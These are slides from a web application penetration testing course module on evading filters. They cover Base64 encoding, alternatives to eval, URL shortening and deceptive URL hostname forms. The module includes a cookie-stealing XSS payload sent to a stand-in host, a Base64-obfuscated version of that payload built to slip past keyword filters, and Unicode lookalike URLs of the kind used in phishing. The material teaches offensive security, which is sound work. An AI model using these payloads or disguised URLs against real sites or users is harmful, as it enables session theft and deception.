Web Application
Penetration Testing
eXtreme
/**/
S e c t i o n 0 1 | M o d u l e 0 2
© Caendra Inc. 2020
All Rights Reserved
Table of Contents
MODULE 02 | /**/
2.1 Base64 Encoding Evasion
2.2 URI Obfuscation Techniques
2.3 JavaScript Obfuscation Techniques
2.4 PHP Obfuscation Techniques
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.2
Introduction & Learning Objectives
We have seen how countermeasures against web
application attacks can be implemented. Sometimes, they
are not sufficient and can easily be circumvented.
There are two solutions: attack vector optimization and
using obfuscation techniques. The last one has been used
heavily in web attacks, in the last 10 years.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.3
Introduction & Learning Objectives
Evading detection techniques is like playing "cops and
robbers". Security researchers (the robbers), arrange a way
to evade detection systems. They use the technique for a
time, but then it becomes public. Next, the cops (the
defenders) implement a solution to fix the vulnerabilities.
Now it's time to produce a new technique
for the robbers!
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.4
Learning Objectives
In this module, we will cover Evasion techniques >
Encoding + Obfuscation.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.5
2.1
Base64 Encoding
Evasion
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.6
2.1 Base64 Encoding Evasion
We have seen in the filter section how detection systems
implement a Regex-based system that searches for
malicious strings.
Let’s suppose that we want to evade a system that inspects
JavaScript code for specific keywords like eval, alert,
prompt, document.cookie, or other potential malicious
strings.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.7
2.1 Base64 Encoding Evasion
A possible way to escape these kinds of filters is by using
Base64 encoding.
Let’s setup an evasion technique for a simple cookie stealer
payload.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.8
2.1.1 Cookie Stealer
To steal cookies, not marked as HttpOnly is relatively easy
and we commonly use this JavaScript payload:
location.href = 'http://evilpath.com/?c='+escape(document.cookie)
As we mentioned before, a Regex-based filtering system
may detect the document.cookie keyword and block the
attack vector.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.9
2.1.1 Cookie Stealer
Using Base64 encoding, we can hide document.cookie
code translating the attack vector into:
eval(atob(bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGgu
Y29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk=))
As you may have noticed, the eval function may be
blacklisted; so, let’s see some alternatives to this function.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.10
2.1.1 Cookie Stealer
A possible way to parse a string as JavaScript is with the
following statement:
[].constructor.constructor("code")()
atob("bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGgu
Y29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk=")
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.11
2.1.1 Cookie Stealer
Other valid methods are:
▪ setTimeout("code") #all browsers
▪ setInterval("code") #all browsers
▪ setImmediate("code") #IE 10+
▪ Function("code")() #all browsers
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.12
2.2
URI Obfuscation
Techniques
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.13
2.2 URI Obfuscation Techniques
URIs are fundamental elements of Internet communications.
They provide a Uniform (local and remote), Resource Identifier
and are central in the web navigation system.
Sometimes, to exploit a vulnerability, you may require a degree of
social engineering, therefore, making URI obfuscation very useful.
It can not only be handy in bypassing a filtered system, but also
to shorten the vector to respect a length limit. Let’s check out
some techniques to obfuscate URIs.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.14
2.2.1 URL Shortening
URL shortening is a technique in which a URL may be
shorter in length and still direct to the required page.
Basically, an HTTP Redirect (301 Moved Permanently)
header is sent from the domain name that is short to the
web page that has a long URL.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.15
2.2.1 URL Shortening
Google URL Shortener
Short URL
Long URL
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.16
2.2.1 URL Shortening
This technique is suitable for messaging systems where
character limits are imposed, such as Twitter's 140 chars
maximum.
The downside is the abuse for illicit internet activities, such
as phishing or spamming.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.17
2.2.1 URL Shortening
Running your own URL shortener is simple and there are
multiple services and libraries that allow you to start the
service easily. For example:
Free and OpenSource Payment service
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.18
2.2.1 URL Shortening
Since this technique has started to spread as an attack
vector to send links to malicious resources, some service
providers have implemented features in order to preview
where the shortened links point to.
This is there in order to help users to understand whether
the link is good or evil.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.19
2.2.1 URL Shortening
Bitly.com Short Link Info
For example, bitly.com (bit.ly / j.mp) and managed
enterprise sites such as amzn.to, on.fb.me, etc. just add a
plus (+) after a short URL.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.20
2.2.1.1 Bitly.com Short Link Info
+
The shows information about the link
bitly.com/hack_me
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.21
2.2.1.1 Bitly.com Short Link Info
Other shortening services implement their technique to
show the "preview" or some information about the
shortened link.
The table on the next slide shows some of the most
common used services.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.22
2.2.1.2 Other Services Short Link Info
Service How to preview
Tinyurl.com Preview SUBDOMAIN
http://preview.tinyurl.com/ph7xh4m
Tiny.cc Trailing TILDE http://tiny.cc/hack_me~
Other interesting services are analyzed here:
http://security.thejoshmeister.com/2009/04/how-to-preview-
shortened-urls-tinyurl.html
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.23
2.2.1.2 Other Services Short Link Info
There are also services that do not provide this feature,
such as t.co used by Twitter. For this kind of service, online
solutions like the following exist:
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.24
http://t.co/
2.2.1.3 cURL Link Resolver
You can have the same result resolving the URLs 'manually’.
For example, using cURL and reading the response headers:
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.25
2.2.2 URL Hostname Obfuscation
We are "used to" viewing URLs in formats like the following:
https://hack.me/s/#n:xss
But RFC 3986 tells us that the these are also valid URLs:
https://hack.me:443
https://_[this_is_valid]PI:EMAIL
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.26
http://tools.ietf.org/html/rfc3986#page-16
2.2.2.1 URL Authority Obfuscation
Starting from the URI structure, what we want to obfuscate
is the Authority component of a URI:
Image taken form RFC 3986
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.27
http://tools.ietf.org/html/rfc3986#page-16
2.2.2.1 URL Authority Obfuscation
The Authority component is structured as follows:
[ userinfo "@" ] host [ ":" port ]
Other than the port subcomponent, we can play with the
userinfo and host. Let’s look at some examples.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.28
2.2.2.1 URL Authority Obfuscation
Obfuscating with Userinfo
The subcomponent is used for authentication.
userinfo
If credentials are required to access a resource, they can be
included here, and the login will be automatic:
http://username:PI:EMAIL/protected_path
If the page requires NO authentication, the subcomponent
text is ignored by both browser and server.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.29
2.2.2.1 URL Authority Obfuscation
Obfuscating with Userinfo – Basic Example
So, if we know that the resource does not require
authentication, then we could play with this URI
subcomponent like the following:
https://PI:EMAIL/t/xss
hack.me does not implement this kind of authentication
and will ignore the www.google.com part (userinfo).
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.30
https://hack.me/
2.2.2.1 URL Authority Obfuscation
Obfuscating with Userinfo –Example with Unicode
In the userinfo subcomponent, Unicode is allowed,
therefore, it does not need other additional clarifications.
See below:
https://✌(◕‿-)✌@hack.me
https://mail.google.com⁄mail⁄u⁄0⁄ʔpli=1＃PI:EMAIL
U+2044
U+FF03
FRACTION SLASH U+0294
FULLWIDTH
LATIN LETTER
NUMBER SIGN
GLOTTAL STOP
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.31
2.2.2.1 URL Authority Obfuscation
Obfuscating with Userinfo
In contrast, not all browsers support this obfuscation
technique. Firefox and Opera show alert messages like
these:
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.32